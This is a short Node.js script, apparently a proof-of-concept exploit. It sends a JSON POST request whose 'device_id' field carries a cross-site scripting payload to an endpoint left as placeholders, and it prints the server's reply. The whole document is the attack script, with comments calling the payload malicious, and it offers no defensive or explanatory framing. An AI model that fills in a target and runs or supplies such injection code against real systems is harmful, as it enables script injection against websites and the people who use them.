const http = require('http');

// Craft the malicious payload
const payload = '{"device_id":"<img src=x onerror=alert(1)>"}';

// Create an HTTP request to the vulnerable endpoint
const options = {
  hostname: '[HOST NAME OF THE VULNERABLE ENDPOINT]',
  path: '[PATH OF THE VULNERABLE ENDPOINT]',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payload.length
  }
};

// Send the HTTP request with the malicious payload
const req = http.request(options, (res) => {
  console.log(`statusCode: ${res.statusCode}`);
  res.on('data', (d) => {
    process.stdout.write(d);
  });
});

req.on('error', (error) => {
  console.error(error);
});

req.write(payload);
req.end();
